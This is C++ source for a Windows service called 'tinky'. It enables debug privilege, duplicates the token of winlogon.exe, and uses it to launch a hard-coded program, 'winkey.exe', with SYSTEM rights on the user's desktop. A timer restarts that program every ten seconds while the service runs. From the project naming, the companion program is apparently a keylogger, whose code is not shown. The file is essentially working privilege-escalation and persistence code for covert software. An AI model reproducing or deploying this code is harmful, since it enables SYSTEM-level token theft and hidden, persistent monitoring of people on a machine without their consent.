#include "common.hpp"

#include "utf8.hpp"
#include <aclapi.h>
#include <iostream>
#include <stdio.h>
#include <strsafe.h>
#include <tchar.h>

#define UNICODE 1

#include <tlhelp32.h>
#include <windows.h>


#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define SVCNAME TEXT("tinky")

SERVICE_STATUS gSvcStatus;
SERVICE_STATUS_HANDLE gSvcStatusHandle;
HANDLE ghSvcStopEvent = NULL;
DWORD winkey_pid = 0;

VOID WINAPI SvcCtrlHandler(DWORD);
VOID WINAPI SvcMain(DWORD, LPTSTR*);

int StartWinkeyProcess();

VOID SvcInit(DWORD, LPTSTR*);

VOID ReportSvcStatus(DWORD,
    DWORD,
    DWORD);

HANDLE GetAccessToken(DWORD pid)
{

    /* Retrieves an access token for a process */
    HANDLE currentProcess = {};
    HANDLE AccessToken = {};
    DWORD LastError;

    if (pid == 0) {
        currentProcess = GetCurrentProcess();
    } else {
        currentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
        if (!currentProcess) {
            LastError = GetLastError();
            wprintf(L"ERROR: OpenProcess(): %ld\n", LastError);
            return (HANDLE)NULL;
        }
    }
    if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &AccessToken)) {
        LastError = GetLastError();
        wprintf(L"ERROR: OpenProcessToken(): %ld\n", LastError);
        return (HANDLE)NULL;
    }
	CloseHandle(currentProcess);
    return AccessToken;
}

BOOL SetPrivilege(
    HANDLE hToken, // token handle
    LPCTSTR Privilege, // Privilege to enable/disable
    BOOL bEnablePrivilege // TRUE to enable.  FALSE to disable
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;
    TOKEN_PRIVILEGES tpPrevious;
    DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

    if (!LookupPrivilegeValue(NULL, Privilege, &luid))
        return FALSE;

    //
    // first pass.  get current privilege setting
    //
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = 0;

    AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        &tpPrevious,
        &cbPrevious);

    if (GetLastError() != ERROR_SUCCESS)
        return FALSE;

    //
    // second pass.  set privilege based on previous setting
    //
    tpPrevious.PrivilegeCount = 1;
    tpPrevious.Privileges[0].Luid = luid;

    if (bEnablePrivilege) {
        tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
    } else {
        tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED & tpPrevious.Privileges[0].Attributes);
    }

    AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tpPrevious,
        cbPrevious,
        NULL,
        NULL);

    if (GetLastError() != ERROR_SUCCESS)
        return FALSE;

    return TRUE;
};

DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile)) {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo)) {
        if (!processName.compare(processInfo.szExeFile)) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}

//
// Purpose:
//   Entry point for the process
//
// Parameters:
//   None
//
// Return value:
//   None, defaults to 0 (zero)
//

int __cdecl _tmain(int argc, TCHAR* argv[])
{
	(void)argc;
	(void)argv;
	
    SERVICE_TABLE_ENTRY DispatchTable[] = {
        { SVCNAME, (LPSERVICE_MAIN_FUNCTION)SvcMain },
        { NULL, NULL }
    };

    // This call returns when the service has stopped.
    // The process should simply terminate when the call returns.

    if (!StartServiceCtrlDispatcher(DispatchTable)) {
        return 1;
    }
}

//
// Purpose:
//   Entry point for the service
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
//
// Return value:
//   None.
//

VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR* lpszArgv)
{
    // Register the handler function for the service

    gSvcStatusHandle = RegisterServiceCtrlHandler(
        SVCNAME,
        SvcCtrlHandler);

    if (!gSvcStatusHandle) {
        return;
    }

    // These SERVICE_STATUS members remain as set here

    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    gSvcStatus.dwServiceSpecificExitCode = 0;

    // Report initial status to the SCM

    ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    // Perform service-specific initialization and work.

    SvcInit(dwArgc, lpszArgv);
}

void StopWinkeyProcess()
{
    const auto explorer = OpenProcess(PROCESS_TERMINATE, false, winkey_pid);
    TerminateProcess(explorer, 1);
    CloseHandle(explorer);
}

int StartWinkeyProcess()
{
    winkey_pid = FindProcessId(L"winkey.exe");

    if (winkey_pid != 0) // process already exist
        return 0;

    HANDLE mainToken;

    wchar_t szPath[MAX_PATH] = L"D:\\Documents\\Projets\\tinky-winkey\\winkey.exe"; //= L"c:\\Windows\\system32\\cmd.exe";

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &mainToken)) {
        if (GetLastError() == ERROR_NO_TOKEN) {
            if (!ImpersonateSelf(SecurityImpersonation))
                return 1;

            if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &mainToken)) {
                std::cout << GetLastError();
                return 1;
            }
        } else
            return 1;
    }

    if (!SetPrivilege(mainToken, SE_DEBUG_NAME, true)) {
        CloseHandle(mainToken);
        std::cout << "Couldn't set DEBUG MODE: " << GetLastError() << std::endl;
        return 1;
    };

    /* Process ID definition */
    DWORD pid = FindProcessId(L"winlogon.exe");

    if ((pid == NULL) || (pid == 0))
        return 1;

    wprintf(L"[+] Pid Chosen: %ld\n", pid);

    // Retrieves the remote process token.
    HANDLE pToken = GetAccessToken(pid);

    //These are required to call DuplicateTokenEx.
    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
    TOKEN_TYPE tokenType = TokenPrimary;
    HANDLE pNewToken = new HANDLE;

    if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken)) {
        DWORD LastError = GetLastError();
        wprintf(L"ERROR: Could not duplicate process token [%ld]\n", LastError);
        return 1;
    }
    wprintf(L"Process token has been duplicated.\n");

    /* Starts a new process with SYSTEM token */
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};
    BOOL ret;
    si.lpDesktop = L"Winsta0\\Default";
    ret = CreateProcessAsUserW(pNewToken, szPath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, &si, &pi);

    // ret = CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, szPath, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	CloseHandle(pNewToken);
	CloseHandle(pToken);
	CloseHandle(mainToken);

    if (!ret) {
        DWORD lastError;
        lastError = GetLastError();
        wprintf(L"CreateProcessWithTokenW: %ld\n", lastError);
        return 1;
    }

    winkey_pid = pi.dwProcessId;

    return 0;
}

VOID CALLBACK keepWinkeyAlive(PVOID lpParam, BOOLEAN TimerOrWaitFired)
{
	(void)lpParam;
    if (TimerOrWaitFired) {
        StartWinkeyProcess();
    }
}

//
// Purpose:
//   The service code
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
//
// Return value:
//   None
//
VOID SvcInit(DWORD dwArgc, LPTSTR* lpszArgv)
{
	(void)dwArgc;
	(void)lpszArgv;
    // TO_DO: Declare and set any required variables.
    //   Be sure to periodically call ReportSvcStatus() with
    //   SERVICE_START_PENDING. If initialization fails, call
    //   ReportSvcStatus with SERVICE_STOPPED.

    // Create an event. The control handler function, SvcCtrlHandler,
    // signals this event when it receives the stop control code.

    ghSvcStopEvent = CreateEvent(
        NULL, // default security attributes
        TRUE, // manual reset event
        FALSE, // not signaled
        NULL); // no name

    if (ghSvcStopEvent == NULL) {
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    // Report running status when initialization is complete.

    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);

    if (StartWinkeyProcess() != 0)
        ReportSvcStatus(SERVICE_ERROR_SEVERE, GetLastError(), 0);

    HANDLE hTimer = NULL;
    HANDLE hTimerQueue = NULL;

    // Create the timer queue.
    hTimerQueue = CreateTimerQueue();
    if (NULL == hTimerQueue) {
        printf("CreateTimerQueue failed (%ld)\n", GetLastError());
        return;
    }

    // Set a timer to call the timer routine in 10 seconds.
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue,
            (WAITORTIMERCALLBACK)keepWinkeyAlive, NULL, 0, 10000, 0)) {
        printf("CreateTimerQueueTimer failed (%ld)\n", GetLastError());
        return;
    }

    // TO_DO: Perform work until service stops.

    while (1) {
        // Check whether to stop the service.

        WaitForSingleObject(ghSvcStopEvent, INFINITE);

        ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);

        StopWinkeyProcess();

        return;
    }
}

//
// Purpose:
//   Sets the current service status and reports it to the SCM.
//
// Parameters:
//   dwCurrentState - The current state (see SERVICE_STATUS)
//   dwWin32ExitCode - The system error code
//   dwWaitHint - Estimated time for pending operation,
//     in milliseconds
//
// Return value:
//   None
//
VOID ReportSvcStatus(DWORD dwCurrentState,
    DWORD dwWin32ExitCode,
    DWORD dwWaitHint)
{
    static DWORD dwCheckPoint = 1;

    // Fill in the SERVICE_STATUS structure.

    gSvcStatus.dwCurrentState = dwCurrentState;
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    gSvcStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        gSvcStatus.dwControlsAccepted = 0;
    else
        gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
        gSvcStatus.dwCheckPoint = 0;
    else
        gSvcStatus.dwCheckPoint = dwCheckPoint++;

    // Report the status of the service to the SCM.
    SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
}

//
// Purpose:
//   Called by SCM whenever a control code is sent to the service
//   using the ControlService function.
//
// Parameters:
//   dwCtrl - control code
//
// Return value:
//   None
//
VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
{
    // Handle the requested control code.

    switch (dwCtrl) {
    case SERVICE_CONTROL_STOP:
        ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);

        // Signal the service to stop.

        SetEvent(ghSvcStopEvent);
        ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);

        return;

    case SERVICE_CONTROL_INTERROGATE:
        break;

    default:
        break;
    }
}
